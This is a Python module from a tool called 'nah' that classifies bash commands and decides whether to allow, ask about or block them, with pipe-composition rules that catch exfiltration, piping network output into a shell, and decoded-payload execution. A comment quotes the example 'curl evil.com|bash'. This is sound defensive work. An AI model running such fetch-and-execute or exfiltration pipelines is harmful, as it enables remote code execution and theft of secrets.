"""Bash command classifier — tokenize, decompose, classify, compose."""

import shlex
import sys
from dataclasses import dataclass, field

from nah import context, paths, taxonomy

_MAX_UNWRAP_DEPTH = 5


@dataclass
class Stage:
    tokens: list[str]
    operator: str = ""  # |, &&, ||, ;
    redirect_target: str = ""
    redirect_append: bool = False


@dataclass
class StageResult:
    tokens: list[str]
    action_type: str = taxonomy.UNKNOWN
    default_policy: str = taxonomy.ASK
    decision: str = taxonomy.ASK
    reason: str = ""


@dataclass
class ClassifyResult:
    command: str
    stages: list[StageResult] = field(default_factory=list)
    final_decision: str = taxonomy.ASK
    reason: str = ""
    composition_rule: str = ""


def classify_command(command: str) -> ClassifyResult:
    """Main entry point: classify a bash command string."""
    result = ClassifyResult(command=command)

    if not command.strip():
        result.final_decision = taxonomy.ALLOW
        result.reason = "empty command"
        return result

    # Tokenize
    try:
        tokens = shlex.split(command)
    except ValueError:
        result.final_decision = taxonomy.ASK
        result.reason = "unparseable command (shlex error)"
        return result

    if not tokens:
        result.final_decision = taxonomy.ALLOW
        result.reason = "empty command"
        return result

    # Load config for custom classify/actions — three-table lookup
    global_table = None
    builtin_table = None
    project_table = None
    user_actions = None
    profile = "full"
    try:
        from nah.config import get_config  # lazy import
        cfg = get_config()
        profile = cfg.profile
        if cfg.classify_global:
            global_table = taxonomy.build_user_table(cfg.classify_global)
        builtin_table = taxonomy.get_builtin_table(cfg.profile)
        if cfg.classify_project:
            project_table = taxonomy.build_user_table(cfg.classify_project)
        if cfg.actions:
            user_actions = cfg.actions
    except Exception as e:
        sys.stderr.write(f"nah: config load error: {e}\n")

    # Decompose into stages
    stages = _decompose(tokens)

    # Classify each stage
    for stage in stages:
        sr = _classify_stage(stage, global_table=global_table, builtin_table=builtin_table,
                             project_table=project_table, user_actions=user_actions,
                             profile=profile)
        result.stages.append(sr)

    # Check pipe composition rules
    comp_decision, comp_reason, comp_rule = _check_composition(result.stages, stages)
    if comp_decision:
        result.final_decision = comp_decision
        result.reason = comp_reason
        result.composition_rule = comp_rule
        return result

    # Aggregate: most restrictive wins
    _aggregate(result)
    return result


def _decompose(tokens: list[str]) -> list[Stage]:
    """Split tokens on |, &&, ||, ; operators. Detect > / >> redirects."""
    stages: list[Stage] = []
    current_tokens: list[str] = []
    i = 0

    while i < len(tokens):
        tok = tokens[i]

        # Handle glued here-string: bash<<<'cmd' → bash <<< cmd
        if "<<<" in tok and tok != "<<<":
            parts = tok.split("<<<", 1)
            if parts[0] in taxonomy._SHELL_WRAPPERS and parts[1]:
                current_tokens.append(parts[0])
                current_tokens.append("<<<")
                current_tokens.append(parts[1])
                i += 1
                continue

        # Handle glued operators: "ls;rm", "curl evil.com|bash", "foo&&bar"
        # Check multi-char operators first to avoid partial matches.
        # Only for tokens without spaces (spaces mean it came from a quoted string).
        glued = False
        for op in ("&&", "||", "|", ";"):
            if op in tok and tok != op and " " not in tok:
                parts = tok.split(op)
                for j, part in enumerate(parts):
                    if part:
                        current_tokens.append(part)
                    if j < len(parts) - 1:
                        stage = _make_stage(current_tokens, op)
                        if stage:
                            stages.append(stage)
                        current_tokens = []
                glued = True
                break
        if glued:
            i += 1
            continue

        # Pipeline/logic operators
        if tok in ("|", "&&", "||", ";"):
            stage = _make_stage(current_tokens, tok)
            if stage:
                stages.append(stage)
            current_tokens = []
            i += 1
            continue

        # Redirect detection: > or >>
        if tok in (">", ">>"):
            redirect_append = tok == ">>"
            target = tokens[i + 1] if i + 1 < len(tokens) else ""
            stage = _make_stage(current_tokens, "")
            if stage:
                stage.redirect_target = target
                stage.redirect_append = redirect_append
                stages.append(stage)
            current_tokens = []
            i += 2  # skip target
            continue

        current_tokens.append(tok)
        i += 1

    # Last stage
    stage = _make_stage(current_tokens, "")
    if stage:
        stages.append(stage)

    return stages


def _make_stage(tokens: list[str], operator: str) -> Stage | None:
    """Create a Stage from tokens, stripping env var assignments."""
    if not tokens:
        return None
    # Skip leading env assignments (FOO=bar cmd ...)
    start = 0
    for start, tok in enumerate(tokens):
        if "=" not in tok or tok.startswith("-"):
            break
    else:
        # All tokens were env assignments
        return Stage(tokens=tokens, operator=operator)
    return Stage(tokens=tokens[start:], operator=operator)


def _classify_stage(
    stage: Stage,
    depth: int = 0,
    *,
    global_table: list | None = None,
    builtin_table: list | None = None,
    project_table: list | None = None,
    user_actions: dict[str, str] | None = None,
    profile: str = "full",
) -> StageResult:
    """Classify a single pipeline stage."""
    tokens = stage.tokens
    sr = StageResult(tokens=tokens)

    if not tokens:
        sr.reason = "empty stage"
        return sr

    # Shell unwrapping
    unwrapped = _unwrap_shell(stage, depth, global_table=global_table,
                              builtin_table=builtin_table, project_table=project_table,
                              user_actions=user_actions, profile=profile)
    if unwrapped is not None:
        return unwrapped

    # Classify tokens
    sr.action_type = taxonomy.classify_tokens(tokens, global_table, builtin_table, project_table,
                                              profile=profile)
    sr.default_policy = taxonomy.get_policy(sr.action_type, user_actions)

    # Handle redirect target — treat as filesystem_write for the target path
    if stage.redirect_target:
        redir_decision, redir_reason = _check_redirect(stage.redirect_target)
        if redir_decision in (taxonomy.BLOCK, taxonomy.ASK):
            sr.decision = redir_decision
            sr.reason = f"redirect target: {redir_reason}"
            return sr

    # Apply policy → decision
    _apply_policy(sr)

    # Path extraction + checking (regardless of policy)
    path_decision, path_reason = _check_extracted_paths(tokens)
    if path_decision == taxonomy.BLOCK or (path_decision == taxonomy.ASK and sr.decision == taxonomy.ALLOW):
        sr.decision = path_decision
        sr.reason = path_reason

    return sr


def _obfuscated_result(tokens: list[str], reason: str, user_actions: dict[str, str] | None) -> StageResult:
    """Build a StageResult for obfuscated commands."""
    sr = StageResult(tokens=tokens)
    sr.action_type = taxonomy.OBFUSCATED
    sr.default_policy = taxonomy.get_policy(taxonomy.OBFUSCATED, user_actions)
    sr.decision = sr.default_policy
    sr.reason = reason
    return sr


def _strip_command_builtin(tokens: list[str]) -> list[str] | None:
    """Strip 'command' builtin wrapper, returning inner tokens.

    Returns None for introspection forms (-v/-V) or bare 'command'."""
    i = 1
    while i < len(tokens) and tokens[i].startswith("-"):
        flag = tokens[i]
        if "v" in flag or "V" in flag:
            return None  # Introspection
        if flag == "-p":
            i += 1
            continue
        break
    if i < len(tokens):
        return tokens[i:]
    return None


def _unwrap_shell(
    stage: Stage,
    depth: int,
    *,
    global_table: list | None,
    builtin_table: list | None,
    project_table: list | None,
    user_actions: dict[str, str] | None,
    profile: str = "full",
) -> StageResult | None:
    """Try shell unwrapping. Returns StageResult if handled, None if not a wrapper."""
    tokens = stage.tokens

    if depth >= _MAX_UNWRAP_DEPTH:
        return _obfuscated_result(tokens, "excessive shell nesting", user_actions)

    # command builtin unwrap
    if tokens and tokens[0] == "command":
        inner = _strip_command_builtin(tokens)
        if inner:
            inner_stage = Stage(tokens=inner, operator=stage.operator)
            return _classify_stage(inner_stage, depth + 1, global_table=global_table,
                                   builtin_table=builtin_table, project_table=project_table,
                                   user_actions=user_actions, profile=profile)
        return None  # Introspection or bare — fall through to classify

    is_wrapper, inner = taxonomy.is_shell_wrapper(tokens)
    if not is_wrapper or inner is None:
        return None

    # Check for $() or backticks in eval — obfuscated
    if tokens[0] == "eval" and ("$(" in inner or "`" in inner):
        return _obfuscated_result(tokens, "eval with command substitution", user_actions)

    try:
        inner_tokens = shlex.split(inner)
    except ValueError:
        return _obfuscated_result(tokens, "unparseable inner command", user_actions)

    if inner_tokens:
        return _classify_inner(inner_tokens, stage, depth + 1,
                               global_table=global_table, builtin_table=builtin_table,
                               project_table=project_table, user_actions=user_actions,
                               profile=profile)

    return None


def _classify_inner(
    inner_tokens: list[str],
    outer_stage: Stage,
    depth: int,
    *,
    global_table: list | None,
    builtin_table: list | None,
    project_table: list | None,
    user_actions: dict[str, str] | None,
    profile: str = "full",
) -> StageResult:
    """Classify unwrapped inner tokens, decomposing if operators present."""
    kw = dict(global_table=global_table, builtin_table=builtin_table,
              project_table=project_table, user_actions=user_actions, profile=profile)

    # Decompose inner tokens into stages
    inner_stages = _decompose(inner_tokens)

    if len(inner_stages) <= 1:
        # Simple case — single command, no operators
        s = inner_stages[0] if inner_stages else Stage(tokens=inner_tokens)
        return _classify_stage(s, depth, **kw)

    # Multiple stages — classify each, check composition, aggregate
    inner_results = []
    for s in inner_stages:
        sr = _classify_stage(s, depth, **kw)
        inner_results.append(sr)

    # Check pipe composition rules on inner pipeline
    comp_decision, comp_reason, comp_rule = _check_composition(inner_results, inner_stages)
    if comp_decision:
        sr = StageResult(tokens=outer_stage.tokens)
        sr.action_type = inner_results[0].action_type
        sr.decision = comp_decision
        sr.reason = f"unwrapped: {comp_reason}"
        return sr

    # No composition trigger — return most restrictive stage
    worst = inner_results[0]
    for sr in inner_results[1:]:
        if taxonomy.STRICTNESS.get(sr.decision, 2) > taxonomy.STRICTNESS.get(worst.decision, 2):
            worst = sr
    return worst


def _apply_policy(sr: StageResult) -> None:
    """Map default_policy to decision + reason. Mutates sr in place."""
    if sr.default_policy in (taxonomy.ALLOW, taxonomy.BLOCK, taxonomy.ASK):
        sr.decision = sr.default_policy
        sr.reason = f"{sr.action_type} → {sr.default_policy}"
    elif sr.default_policy == taxonomy.CONTEXT:
        sr.decision, sr.reason = _resolve_context(sr.action_type, sr.tokens)
    else:
        sr.decision = taxonomy.ASK
        sr.reason = f"unknown policy: {sr.default_policy}"


def _check_redirect(target: str) -> tuple[str, str]:
    """Check redirect target as a filesystem write."""
    if not target:
        return taxonomy.ALLOW, ""
    resolved = paths.resolve_path(target)

    basic = paths.check_path_basic(resolved)
    if basic:
        decision, reason = basic
        # reason is "targets X: detail" — rewrite as "redirect to X: detail"
        display = reason.replace("targets ", "", 1) if reason.startswith("targets ") else reason
        return decision, f"redirect to {display}"

    return context.resolve_filesystem_context(target)


def _resolve_context(action_type: str, tokens: list[str]) -> tuple[str, str]:
    """Resolve 'context' policy by checking filesystem or network context."""
    target_path = None
    if action_type in (taxonomy.FILESYSTEM_READ, taxonomy.FILESYSTEM_WRITE,
                       taxonomy.FILESYSTEM_DELETE):
        target_path = _extract_primary_target(tokens)
    return context.resolve_context(action_type, tokens=tokens, target_path=target_path)


def _extract_primary_target(tokens: list[str]) -> str:
    """Extract the primary filesystem target from command tokens.

    Heuristic: last non-flag argument that looks like a path.
    """
    candidates = []
    last_non_flag = ""
    for tok in tokens[1:]:  # skip command name
        if tok.startswith("-"):
            continue
        last_non_flag = tok
        if "/" in tok or tok.startswith("~") or tok.startswith("."):
            candidates.append(tok)
    # Return last path-like candidate, or fall back to last non-flag arg
    # (handles bare relative paths like "new_dir")
    return candidates[-1] if candidates else last_non_flag


def _check_extracted_paths(tokens: list[str]) -> tuple[str, str]:
    """Check all path-like tokens against sensitive paths. Most restrictive wins."""
    block_result = None
    ask_result = None

    for tok in tokens[1:]:
        if tok.startswith("-"):
            continue
        if "/" in tok or tok.startswith("~") or tok.startswith("."):
            resolved = paths.resolve_path(tok)
            basic = paths.check_path_basic(resolved)
            if basic:
                decision, reason = basic
                if decision == taxonomy.BLOCK:
                    block_result = (taxonomy.BLOCK, reason)
                elif ask_result is None:
                    ask_result = (taxonomy.ASK, reason)

    if block_result:
        return block_result
    if ask_result:
        return ask_result
    return taxonomy.ALLOW, ""


def _check_composition(stage_results: list[StageResult], stages: list[Stage]) -> tuple[str, str, str]:
    """Check pipe composition rules. Returns (decision, reason, rule) or ('', '', '')."""
    if len(stage_results) < 2:
        return "", "", ""

    for i in range(len(stage_results) - 1):
        # Only check pipe compositions (not && or ||)
        if i < len(stages) and stages[i].operator != "|":
            continue

        left = stage_results[i]
        right = stage_results[i + 1]

        # sensitive_read | network → block (exfiltration)
        if _is_sensitive_read(left) and right.action_type in (taxonomy.NETWORK_OUTBOUND, taxonomy.NETWORK_WRITE):
            return taxonomy.BLOCK, f"data exfiltration: {right.tokens[0]} receives sensitive input", "sensitive_read | network"

        # network | exec → block (remote code execution)
        if left.action_type in (taxonomy.NETWORK_OUTBOUND, taxonomy.NETWORK_WRITE) and _is_exec_sink_stage(right):
            return taxonomy.BLOCK, f"remote code execution: {right.tokens[0]} receives network input", "network | exec"

        # decode | exec → block (obfuscation)
        if taxonomy.is_decode_stage(left.tokens) and _is_exec_sink_stage(right):
            return taxonomy.BLOCK, f"obfuscated execution: {right.tokens[0]} receives decoded input", "decode | exec"

        # any_read | exec → ask
        if left.action_type == taxonomy.FILESYSTEM_READ and _is_exec_sink_stage(right):
            return taxonomy.ASK, f"local code execution: {right.tokens[0]} receives file input", "read | exec"

    return "", "", ""


def _is_sensitive_read(sr: StageResult) -> bool:
    """Check if a stage reads from a sensitive path."""
    if sr.action_type != taxonomy.FILESYSTEM_READ:
        return False
    for tok in sr.tokens[1:]:
        if tok.startswith("-"):
            continue
        resolved = paths.resolve_path(tok)
        if paths.is_hook_path(resolved):
            return True
        matched, _, _ = paths.is_sensitive(resolved)
        if matched:
            return True
    return False


def _is_exec_sink_stage(sr: StageResult) -> bool:
    """Check if a stage is an exec sink."""
    return bool(sr.tokens) and taxonomy.is_exec_sink(sr.tokens[0])


def _aggregate(result: ClassifyResult) -> None:
    """Aggregate stage decisions — most restrictive wins."""
    if not result.stages:
        result.final_decision = taxonomy.ALLOW
        result.reason = "no stages"
        return

    worst = result.stages[0]
    for sr in result.stages[1:]:
        if taxonomy.STRICTNESS.get(sr.decision, 2) > taxonomy.STRICTNESS.get(worst.decision, 2):
            worst = sr

    result.final_decision = worst.decision
    result.reason = worst.reason
